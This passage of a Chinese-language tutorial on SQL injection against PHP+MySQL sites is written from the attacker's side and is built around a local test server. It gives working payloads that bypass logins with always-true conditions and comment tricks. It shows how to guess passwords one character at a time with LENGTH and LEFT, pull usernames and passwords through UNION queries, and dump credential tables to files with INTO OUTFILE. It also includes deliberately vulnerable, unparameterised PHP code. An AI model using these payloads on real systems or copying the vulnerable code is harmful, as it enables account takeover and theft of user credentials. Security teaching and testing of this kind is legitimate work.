早期的时候，根据程序的代码，要构造出没有引号的语句形成有效的攻击，还真的有点困难，好在现在的技术已经构造出不带引号的语句应用在某些场合。只要有经验，其实构造有效的语句一点也不难，甚至成功率也很高，但具体情况具体分析。首先要走出一个误区。</p><p><em>注：在没有具体说明的情况下，我们假设magic_quotes_gpc均为off。</em></p><p><span style="font-weight:700;">php+Mysql注入的误区</span></p><p>　　很多人认为在PHP+MYSQL下注入一定要用到单引号，或者是没有办法像MSSQL那样可以使用“declare @a sysname select @a=&lt;command&gt; exec master.dbo.xp_cmdshell @a”这类的命令来消除引号，其实这个是大家对注入的一种误解或这说是对注入认识上的一种误区。<br>　　为什么呢？因为不管在什么语言里，在引号（包括单双）里，所有字符串均是常量，即使是dir这样的命令，也紧紧是字符串而已，并不能当做命令执行，除非是这样写的代码：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><span style="color:#0000ff;">$command = "dir c:\";<br>system($command);</span></td></tr></tbody></table></div><p>　　否则仅仅只是字符串，当然，我们所说的命令不单指系统命令，我们这里说的是SQL语句，要让我们构造的SQL语句正常执行，就不能让我们的语句变成字符串，那么什么情况下会用单引号？什么时候不用呢？看看下面两句SQL语句：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><span style="color:#0000ff;">①SELECT * FROM article WHERE articleid='$id'<br>②SELECT * FROM article WHERE articleid=$id</span></td></tr></tbody></table></div><p>　　两种写法在各种程序中都很普遍，但安全性是不同的，第一句由于把变量$id放在一对单引号中，这样使得我们所提交的变量都变成了字符串，即使包含了正确的SQL语句，也不会正常执行，而第二句不同，由于没有把变量放进单引号中，那我们所提交的一切，只要包含空格，那空格后的变量都会作为SQL语句执行，我们针对两个句子分别提交两个成功注入的畸形语句，来看看不同之处。</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">① 指定变量$id为：<br>1' and 1=2 union select * from user where userid=1/*<br>此时整个SQL语句变为：<br>SELECT * FROM article WHERE articleid='1' and 1=2 union select * from user where userid=1/*'</span></p><p><span style="color:#0000ff;">②指定变量$id为：<br>1 and 1=2 union select * from user where userid=1<br>此时整个SQL语句变为：<br>SELECT * FROM article WHERE articleid=1 and 1=2 union select * from user where userid=1</span></p></td></tr></tbody></table></div><p>　　看出来了吗？由于第一句有单引号，我们必须先闭合前面的单引号，这样才能使后面的语句作为SQL执行，并要注释掉后面原SQL语句中的后面的单引号，这样才可以成功注入，如果php.ini中magic_quotes_gpc设置为on或者变量前使用了addslashes()函数，我们的攻击就会化为乌有，但第二句没有用引号包含变量，那我们也不用考虑去闭合、注释，直接提交就OK了。<br>　　大家看到一些文章给出的语句中没有包含单引号例如pinkeyes的《php注入实例》中给出的那句SQL语句，是没有包含引号的，大家不要认为真的可以不用引号注入，仔细看看PHPBB的代码，就可以发现，那个$forum_id所在的SQL语句是这样写的：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$sql = "SELECT *<br>FROM " . FORUMS_TABLE . "<br>WHERE forum_id = $forum_id";</span></p></td></tr></tbody></table></div><p>　　由于没有用单引号包含变量，才给pinkeyes这个家伙有机可乘，所以大家在写PHP程序的时候，记得用单引号把变量包含起来。当然，必要的安全措施是必不可少的。</p><p><span style="font-weight:700;">简单的例子</span></p><p>　　先举一个例子来给大家了解一下PHP下的注入的特殊性和原理。当然，这个例子也可以告诉大家如何学习构造有效的SQL语句。<br>　　我们拿一个用户验证的例子，首先建立一个数据库和一个数据表并插入一条记录，如下：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE `user` (<br>`userid` int(11) NOT NULL auto_increment,<br>`username` varchar(20) NOT NULL default '',<br>`password` varchar(20) NOT NULL default '',<br>PRIMARY KEY (`userid`)<br>) TYPE=MyISAM AUTO_INCREMENT=3 ;</span></p><p><span style="color:#0000ff;">#<br># 导出表中的数据 `user`<br>#</span></p><p><span style="color:#0000ff;">INSERT INTO `user` VALUES (1, 'angel', 'mypass');</span></p></td></tr></tbody></table></div><p>　　验证用户文件的代码如下：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;?php<br>$servername = "localhost";<br>$dbusername = "root";<br>$dbpassword = "";<br>$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("数据库连接失败");</span></p><p><span style="color:#0000ff;">$sql = "SELECT * FROM user WHERE username='$username' AND password='$password'";</span></p><p><span style="color:#0000ff;">$result = mysql_db_query($dbname, $sql);<br>$userinfo = mysql_fetch_array($result);</span></p><p><span style="color:#0000ff;">if (empty($userinfo))<br>{<br>echo "登陆失败";<br>} else {<br>echo "登陆成功";<br>}</span></p><p><span style="color:#0000ff;">echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br>?&gt;</span></p></td></tr></tbody></table></div><p>　　这时我们提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' or 1=1</span></p></td></tr></tbody></table></div><p>　　就会返回：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in F:\www\injection\user.php on line 13<br>登陆失败</span></p><p><span style="color:#0000ff;">SQL Query:SELECT * FROM user WHERE username='angel' or 1=1' AND password=''</span></p><p><span style="color:#0000ff;">PHP Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in F:\www\injection\user.php on line 13</span></p></td></tr></tbody></table></div><p>　　看到了吗？单引号闭合后，并没有注释掉后面的单引号，导致单引号没有正确配对，所以由此可知我们构造的语句不能让Mysql正确执行，要重新构造：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' or '1=1</span></p></td></tr></tbody></table></div><p>　　这时显示“登陆成功”，说明成功了。或者提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel'/*<br>http://127.0.0.1/injection/user.php?username=angel'%23</span></p></td></tr></tbody></table></div><p>　　这样就把后面的语句给注释掉了！说说这两种提交的不同之处，我们提交的第一句是利用逻辑运算，在ASP中运用可以说是非常广泛的，这个不用说了吧？第二、三句是根据mysql的特性，mysql支持/*和#两种注释格式，所以我们提交的时候是把后面的代码注释掉，值得注意的是由于编码问题，在IE地址栏里提交#会变成空的，所以我们在地址栏提交的时候，应该提交%23，才会变成#，就成功注释了，这个比逻辑运算简单得多了，由此可以看出PHP比ASP强大灵活多了。<br>　　通过上面的例子大家应该对PHP+MYSQL的注入有个感性的认识了吧？</p><p><span style="font-weight:700;">语句构造</span></p><p>　　PHP+MYSQL注入的博大精深不仅仅体现在认证体系的饶过，语句的构造才是最有趣味的地方，但构造语句和ACCESS、MSSQL都有少许不同，但同样可以发挥得淋漓尽致。看下面的例子。</p><p><span style="font-weight:700;">一、搜索引擎</span></p><p>　　网上有一大堆的PHP程序搜索引擎是有问题的，也就是提交特殊字符可以显示所有记录，包括不符合条件的，其实这个危害也不算大，因为允许用户输入关键字进行模糊查询的地方大多数都允许检索所有的记录。很多查询的设计就是这样的。<br>　　查询是只读的操作应该不会对数据产生破坏作用，不要太担心。不过泄露隐私不知道算不算危害，下面是一个标准的搜索引擎：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;form method="GET" action="search.php" &gt;<br>&lt;input name="keywords" type="text" value="" size="15"&gt; &lt;input type="submit" value="Search"&gt;<br>&lt;/form&gt;<br>&lt;p&gt;&lt;b&gt;Search result&lt;/b&gt;&lt;/p&gt;</span></p><p><span style="color:#0000ff;">&lt;?php<br>$servername = "localhost";<br>$dbusername = "root";<br>$dbpassword = "";<br>$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("数据库连接失败");</span></p><p><span style="color:#0000ff;">$keywords = $_GET['keywords'];<br>if (!empty($keywords)) {<br>　　//$keywords = addslashes($keywords);<br>　　//$keywords = str_replace("_","\_",$keywords);<br>　　//$keywords = str_replace("%","\%",$keywords);</span></p><p><span style="color:#0000ff;">　　$sql = "SELECT * FROM ".$db_prefix."article WHERE title LIKE '%$keywords%' $search ORDER BY title DESC";<br>　　$result = mysql_db_query($dbname,$sql);<br>　　$tatol=mysql_num_rows($result);</span></p><p><span style="color:#0000ff;">　　echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";</span></p><p><span style="color:#0000ff;">　　if ($tatol &lt;=0){<br>　　　　echo "The \"&lt;b&gt;$keywords&lt;/b&gt;\" was not found in all the record.&lt;p&gt;\n";<br>　　} else {<br>　　　　while ($article=mysql_fetch_array($result)) {<br>　　　　　　echo "&lt;li&gt;".htmlspecialchars($article[title])."&lt;p&gt;\n";<br>　　　　} //while<br>　　}<br>} else {<br>　　echo "&lt;b&gt;Please enter some keywords.&lt;/b&gt;&lt;p&gt;\n";<br>}<br>?&gt;</span></p></td></tr></tbody></table></div><p>　　一般程序都是这样写的，如果缺乏变量检查，我们就可以改写变量，达到“注入”的目的，尽管没有危害，当我们输入“___” 、“.__ ”、“%”等类似的关键字时，会把数据库中的所有记录都取出来。如果我们在表单提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">%' ORDER BY articleid/*<br>%' ORDER BY articleid#<br>__' ORDER BY articleid/*<br>__' ORDER BY articleid#</span></p></td></tr></tbody></table></div><p>　　SQL语句就被改变成下面的样子了，</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE title LIKE '%%' ORDER BY articleid/*%' ORDER BY title DESC<br>SELECT * FROM article WHERE title LIKE '%__' ORDER BY articleid#%' ORDER BY title DESC</span></p></td></tr></tbody></table></div><p>　　就会列出所有记录，包括被隐藏的，还可以改变排列顺序。这个虽然危害不大，也算是注入的一种方式了吧？</p><p><span style="font-weight:700;">二、查询字段</span></p><p>　　查询字段又可以分成两种，本表查询和跨表查询，这两种查询和ACCESS、MSSQL差不多，甚至更强大、更灵活、更方便。不知道为什么就是有人认为比ASP难？我们在ASP中经常使用的个别函数在PHP里要有小小的改动，如下：</p><p><span style="font-weight:700;">① 本表查询</span></p><p>　　看下面一条SQL语句，多用在论坛或者会员注册系统查看用户资料的，</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;?php<br>$servername = "localhost";<br>$dbusername = "root";<br>$dbpassword = "";<br>$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("数据库连接失败");</span></p><p><span style="color:#0000ff;">$sql = "SELECT * FROM user WHERE username='$username'";<br>$result = mysql_db_query($dbname,$sql);<br>$row = mysql_fetch_array($result);</span></p><p><span style="color:#0000ff;">if (!$row) {<br>　　echo "该记录不存在";<br>　　echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br>　　exit;<br>}</span></p><p><span style="color:#0000ff;">echo "你要查询的用户ID是：$row[userid]\n";<br>echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br>?&gt;</span></p></td></tr></tbody></table></div><p>　　当我们提交的用户名为真时，就会正常返回用户的ID，如果为非法参数就会提示相应的错误，由于是查询用户资料，我们可以大胆猜测密码就存在这个数据表里（现在我还没有碰见过密码是单独存在另一个表的程序），记得刚才的身份验证程序吗？和现在的相比，就少了一个AND条件，如下：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='$username' AND password='$password'SELECT * FROM user WHERE username='$username'</span></p></td></tr></tbody></table></div><p>　　相同的就是当条件为真时，就会给出正确的提示信息，如果我们构造出后面的AND条件部分，并使这部分为真，那我们的目的也就达到了，还是利用刚才建立的user数据库，用户名为angel，密码为mypass，<br>看了上面的例子，应该知道构造了吧，如果我们提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' and password='mypass</span></p></td></tr></tbody></table></div><p>　　这个是绝对为真的，因为我们这样提交上面的SQL语句变成了下面的样子：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='angel' AND password='mypass'</span></p></td></tr></tbody></table></div><p>　　但在实际的攻击中，我们是肯定不知道密码的，假设我们知道数据库的各个字段，下面我们就开始探测密码了，首先获取密码长度：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' and LENGTH(password)='6</span></p></td></tr></tbody></table></div><p>　　在ACCESS中，用LEN()函数来获取字符串长度，在MYSQL中，要使用LENGTH()，只要没有构造错误，也就是说SQL语句能正常执行，那返回结果无外乎两种，不是返回用户ID，就是返回“该记录不存在”。当用户名为angel并且密码长度为6的时候返回真，就会返回相关记录，是不是和ASP里一样？再用LEFT()、RIGHT()、MID()函数猜密码：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,1)='m<br>http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,2)='my<br>http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,3)='myp<br>http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,4)='mypa<br>http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,5)='mypas<br>http://127.0.0.1/injection/user.php?username=angel' and LEFT(password,6)='mypass</span></p></td></tr></tbody></table></div><p>　　看，密码不是出来了吗？简单吧？当然实际情况会有不少条件限制，下面还会讲到这个例子的深入应用。</p><p><span style="font-weight:700;">② 跨表查询</span></p><p>　　这部分就和ASP有点出入了，除了一定要用UNION连接两条SQL语句，最难掌握的就是字段的数量，如果看过MYSQL参考手册，就知道了在 SELECT 中的 select_expression (select_expression 表示你希望检索的列[字段]) 部分列出的列必须具有同样的类型。第一个 SELECT 查询中使用的列名将作为结果集的列名返回。简单的说，也就是UNION后面查选的字段数量、字段类型都应该与前面的SELECT一样，而且，如果前面的SELECT为真，就同时返回两个SELECT的结果，当前面的SELECT为假，就会返回第二个SELECT所得的结果，某些情况会替换掉在第一个SELECT原来应该显示的字段，如下图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="405" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/union.gif" width="700" style="border:0px;"></p><p>　　看了这个图直观多了吧？所以应该先知道前面查询表的数据表的结构。如果我们查询两个数据表的字段相同，类型也相同，我们就可以这样提交:</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='$id' UNION SELECT * FROM……</span></p></td></tr></tbody></table></div><p>　　如果字段数量、字段类型任意一个不相同，就只能搞清除数据类型和字段数量，这样提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='$id' UNION SELECT 1,1,1,1,1,1,1 FROM……</span></p></td></tr></tbody></table></div><p>　　否则就会报错：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">The used SELECT statements have a different number of columns</span></p></td></tr></tbody></table></div><p>　　如果不知道数据类型和字段数量，可以用1来慢慢试，因为1属于int\str\var类型，所以我们只要慢慢改变数量，一定可以猜到的。如果不能马上理解上面的理论，后面有很详细的例子。<br>　　我们看看下面的数据结构，是一个简单的文章数据表。</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE `article` (<br>`articleid` int(11) NOT NULL auto_increment,<br>`title` varchar(100) NOT NULL default '',<br>`content` text NOT NULL,<br>PRIMARY KEY (`articleid`)<br>) TYPE=MyISAM AUTO_INCREMENT=3 ;</span></p><p><span style="color:#0000ff;">#<br># 导出表中的数据 `article`<br>#</span></p><p><span style="color:#0000ff;">INSERT INTO `article` VALUES (1, '我是一个不爱读书的孩子', '中国的教育制度真是他妈的落后！如果我当教育部长。我要把所有老师都解雇！');<br>INSERT INTO `article` VALUES (2, '我恨死你', '我恨死你了，你是什么东西啊');</span></p></td></tr></tbody></table></div><p>　　这个表的字段类型分别是int、varchar、text，如果我们用UNION联合查询的时候，后面的查询的表的结构和这个一样。就可以用“SELECT *”，如果有任何一个不一样，那我们只能用“SELECT 1,1,1,1……”了。</p><p>　　下面的文件是一个很标准、简单的显示文章的文件，很多站点都是这种页面没有过滤，所以成为最明显的注入点，下面就拿这个文件作为例子，开始我们的注入实验。</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;?php<br>$servername = "localhost";<br>$dbusername = "root";<br>$dbpassword = "";<br>$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("数据库连接失败");</span></p><p><span style="color:#0000ff;">$sql = "SELECT * FROM article WHERE articleid='$id'";<br>$result = mysql_db_query($dbname,$sql);<br>$row = mysql_fetch_array($result);</span></p><p><span style="color:#0000ff;">if (!$row)<br>{<br>　　echo "该记录不存在";<br>　　echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br>　　exit;<br>}</span></p><p><span style="color:#0000ff;">echo "title&lt;br&gt;".$row[title]."&lt;p&gt;\n";<br>echo "content&lt;br&gt;".$row[content]."&lt;p&gt;\n";<br>echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br>?&gt;</span></p></td></tr></tbody></table></div><p>正常情况下，我们提交这样的一个请求：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1</span></p></td></tr></tbody></table></div><p>　　就会显示articleid为1的文章，但我们不需要文章，我们需要的是用户的敏感信息，就要查询user表，现在是查询刚才我们建立的user表。<br>　　由于$id没有过滤给我们制造了这个机会，我们要把show.php文件中的SQL语句改写成类似这个样子：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='$id' UNION SELECT * FROM user ……</span></p></td></tr></tbody></table></div><p>　　由于这个代码是有单引号包含着变量的，我们现在提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1' union select 1,username,password from user/*</span></p></td></tr></tbody></table></div><p>　　按道理说，应该显示用户表的username、password两个字段的内容才对啊，怎么正常显示文章呢？如图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="180" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php2.gif" width="778" style="border:0px;"></p><p>　　其实，我们提交的articleid=1是article表里存在的，执行结果就是真了，自然返回前面SELECT的结果，当我们提交空的值或者提交一个不存在的值，就会蹦出我们想要的东西：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=' union select 1,username,password from user/*<br>http://127.0.0.1/injection/show.php?id=99999' union select 1,username,password from user/*</span></p></td></tr></tbody></table></div><p>　　如图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="180" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php3.gif" width="770" style="border:0px;"></p><p>　　现在就在字段相对应的地方显示出我们所要的内容。如果还不清楚思路以及具体的应用，后面还会讲到一些高级的技巧。</p><p><span style="font-weight:700;">三、导出文件</span></p><p>　　这个是比较容易构造但又有一定限制的技术，我们经常可以看见以下的SQL语句：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">select * from table into outfile 'c:/file.txt'<br>select * from table into outfile '/var/www/file.txt'</span></p></td></tr></tbody></table></div><p>　　但这样的语句，一般很少用在程序里，有谁会把自己的数据导出呢？除非是备份，但我也没有见过这种备份法。所以我们要自己构造，但必须有下面的前提条件：</p><ul style="list-style:none;color:rgb(69,69,69);"><li>必须导出到能访问的目录，这样才能下载。</li><li>能访问的目录必须要有可写的权限，否则导出会失败。</li><li>确保硬盘有足够的容量能容下导出的数据，这个很少见。</li><li>确保要已经存在相同的文件名，会导致导出失败，并提示：“File 'c:/file.txt' already exists”，这样可以防止数据库表和文件例如/etc/passwd被破坏。</li></ul><p>　　我们继续用上面的user.php和show.php两个文件举例，如果一个一个用户猜解实在是太慢了，如果对方的密码或者其他敏感信息很复杂，又不会写Exploit，要猜到什么时候啊？来点大范围的，直接导出全部数据好了。user.php文件的查询语句，我们按照into outfile的标准格式，注入成下面的语句就能导出我们需要的信息了：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='$username' into outfile 'c:/file.txt'</span></p></td></tr></tbody></table></div><p>　　知道怎么样的语句可以实现我们的目的，我们就很容易构造出相应的语句：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' into outfile 'c:/file.txt</span></p></td></tr></tbody></table></div><p>　　出现了错误提示，但从返回的语句看来，我们的SQL语句确实是注入正确了，即使出现错误，也是查询的问题了，文件还是乖乖的被导出了，如图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="479" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php4.gif" width="701" style="border:0px;"></p><p>　　由于代码本身就有WHERE来指定一个条件，所以我们导出的数据仅仅是满足这个条件的数据，如果我们想导出全部呢？其实很简单，只要使这个WHERE条件为假，并且指定一个成真的条件，就可以不用被束缚在WHERE里了，来看看经典1=1发挥作用了：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=' or 1=1 into outfile 'c:/file.txt</span></p></td></tr></tbody></table></div><p>　　实际的SQL语句变为：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='' or 1=1 into outfile 'c:/file.txt'</span></p></td></tr></tbody></table></div><p>　　这样username的参数是空的，就是假了，1=1永远是真的，那or前面的WHERE就不起作用了，但千万别用and哦，否则是不能导出全部数据的。<br>　　既然条件满足，在这种情况下就直接导出所有数据！如图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="126" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php5.GIF" width="479" style="border:0px;"></p><p>　　但是跨表的导出文件的语句该怎么构造呢？还是用到UNION联合查询，所以一切前提条件都应该和UNION、导出数据一样，跨表导出数据正常情况下应该相下面的一样：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='1' union select 1,username,password from user into outfile 'c:/user.txt'</span></p></td></tr></tbody></table></div><p>　　这样可以导出文件了，如果我们要构造就提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1' union select 1,username,password from user into outfile 'c:/user.txt</span></p></td></tr></tbody></table></div><p>　　文件是出来了，可是有一个问题，由于前面的查询articleid='1'为真了，所以导出的数据也有整个文章的一部分，如图：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="134" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php6.gif" width="544" style="border:0px;"></p><p>　　所以我们把应该使前面的查询语句为假，才能只导出后面查询的内容，只要提交：</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=' union select 1,username,password from user into outfile 'c:/user.txt</span></p></td></tr></tbody></table></div><p>　　这样才能得到我们想要的资料：</p><p align="center"><img title="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" height="126" alt="SQL注入语句大全 - 【轰隆隆】 - 龙在天涯" src="http://www.4ngel.net/img/php5.GIF" width="479" style="border:0px;"></p><p>　　